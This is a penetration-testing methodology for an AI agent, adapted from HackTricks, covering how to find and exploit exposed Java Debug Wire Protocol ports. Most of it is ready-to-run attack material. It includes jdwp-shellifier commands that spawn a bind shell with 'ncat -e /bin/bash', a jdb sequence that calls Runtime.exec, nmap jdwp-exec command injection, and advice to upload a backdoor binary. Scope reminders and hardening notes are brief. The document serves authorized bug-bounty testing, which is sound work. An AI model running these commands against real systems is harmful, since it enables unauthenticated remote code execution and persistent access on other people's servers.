---
technology: "Java Debug Wire Protocol (JDWP)"
kind: bug-bounty-methodology
audience: ai-agent
family: java
version: 1.0 (upstream-only new unit)
source: "rewritten from HackTricks (src/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol.md), CC BY-NC 4.0, accessed 2026-11-13"
status: upstream-only
provenance: "upstream-only: zero corpus evidence by design — methodology built from the upstream reference and primary sources. Verified 2026-11-13: IOActive research post (five-step chain, protocol properties, tested JDK set, IBM JDK banner-first, nmap jdwp-exec IDSizes caveat); hugsy/jdwp-shellifier README — current fork usage verified as jdwp-shellifier.py [-t IP] [-p PORT] [--break-on JAVA_METHOD] [-c COMMAND] (the original IOActive script spelled the command option --cmd); nmap nsedoc jdwp-exec (argument jdwp-exec.cmd, injects the JDWPSystemInfo class from nselib/jdwp-class/). Companion overview: [[jdwp|JDWP]]."
---

# JDWP bug bounty methodology

Target model: a JVM listening with a `dt_socket` debug transport. There is no credential stage — reachability is the whole gate. Everything you execute runs as the JVM's OS user, and every breakpoint you arm pauses application threads; scope authorization accordingly, and prefer the non-intrusive info-only mode for the first proof.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Handshake echo on any port | `JDWP-Handshake` probe answered | yes | Confirmed JDWP + version via `VirtualMachine/Version` — Info, precursor to RCE |
| Reachable debug transport | tooling that negotiates IDSizes | yes | Method invocation → command execution — Critical |
| nmap `jdwp-exec` NSE | script works on the target's structure sizes | yes | Command output via injected class — often fails (hardcoded sizes); use as secondary |

## Phase 1 — detect and fingerprint

```bash
# One-probe confirmation: the peer must echo the exact 14-byte string
printf 'JDWP-Handshake' | nc -w 3 TARGET_IP 8000
```

- `nmap -sV` identifies the service on scans; internet-wide, Shodan-style banner queries (`JDWP-Handshake`) catch even IBM JDK builds observed announcing the banner *without* a probe.
- After the handshake, the `VirtualMachine/Version` reply gives `vmVersion`/`vmName` (e.g. `OpenJDK 64-Bit Server VM, 11.0.16`, jdwp protocol `11.0`) — record it; it decides nothing about exploitability (the primitive is version-independent) but anchors the report.
- On a host you can inspect, confirm intent in the process list: `-agentlib:jdwp`, legacy `-Xrunjdwp`, or `jdwp` inside `JAVA_OPTS`/`JAVA_TOOL_OPTIONS` (watch for the `jdwk` typo when grepping).
- Conventional ports to sweep: 8000 (Tomcat JPDA), 5005 (IDE default), 8787, 8080, plus whatever the launch flags say.

## Phase 2 — exploit with jdwp-shellifier

The maintained Hugsy fork of IOActive's script (Python 3; the original IOActive script used the long option `--cmd`, the fork documents `-c`):

```bash
# Info-only mode (default): reads OS/Java version through Java — the non-intrusive PoC
python3 jdwp-shellifier.py -t TARGET_IP -p 8000
# Command execution (runs as the JVM's OS user)
python3 jdwp-shellifier.py -t TARGET_IP -p 8000 -c 'ncat -l -p 1337 -e /bin/bash'
# More stable breakpoint: fires on near-any activity, no service interaction needed
python3 jdwp-shellifier.py -t TARGET_IP -p 8000 --break-on 'java.lang.String.indexOf' -c 'ncat -l -p 1337 -e /bin/bash'
```

- Default breakpoint `java.net.ServerSocket.accept` needs one incoming connection to the target service to fire — poke the app if nothing happens.
- Stability ladder (verified operator lore from the original research): `String.indexOf` breakpoint > `ServerSocket.accept`; and executing an uploaded backdoor binary once beats driving repeated debugger invocations.
- The script implements the full chain for you: class/method discovery for `java.lang.Runtime`, event arming, payload string allocation, `getRuntime()` and `exec()` invocation, with suspend/resume to limit disruption.

## Phase 3 — stock-JDK path with jdb (attacker-side only)

When policy bars third-party scripts, the JDK's own `jdb` client performs the same chain interactively:

```text
jdb -attach TARGET_IP:8000
> stop in java.lang.String.indexOf        # arm the context-supplying breakpoint
> cont                                     # resume; use the app until it fires
                                           # breakpoint hit → you hold a live thread frame
> print java.lang.Runtime.getRuntime().exec("id")
```

Expression evaluation at a breakpoint frame compiles and runs Java *in the debuggee* — the same `ClassType/InvokeMethod`/`ObjectReference/InvokeMethod` primitives under a REPL. Wrap output capture yourself (`Scanner` over `getInputStream()`) since `print` shows the returned object, not command output. Subcommands you will use: `stop in`, `cont`, `threads`, `where`, `print`.

## Phase 4 — nmap NSE (secondary)

```bash
nmap -p 8000 --script jdwp-exec --script-args jdwp-exec.cmd='id' TARGET_IP
```

Injects the `JDWPSystemInfo` class (from `nselib/jdwp-class/`) and runs its method with your command. Known caveat from the primary research: the script historically hardcodes `IDSizes` values, so it fails against JVMs whose structure sizes differ — treat a clean shellifier result as authoritative over an NSE failure.

## Decision points

- Handshake answered → report-worthy on its own (unauthenticated debugger exposure); proceed to info-only mode for evidence, then command execution per scope.
- Shellifier hangs at "waiting for event" → wrong breakpoint frequency: switch to `String.indexOf` or generate traffic against the app.
- Windows targets → the same invocation chain works (`Runtime.exec` with `cmd /c`); only your payload syntax changes.
- Hardening notes for the report: bind the transport to loopback or drop the flag in production; a tunnel reduces exposure but adds no protocol authentication.

## Tool mapping (named in prose)

jdwp-shellifier (Hugsy fork; original by IOActive) as the primary client; `jdb`, bundled with the stock JDK, as the no-extra-tooling alternative; nmap with the jdwp-exec NSE script as scan-time execution; nc/ncat for the handshake probe and catch shells; masscan or fleet scans over the conventional ports for discovery.
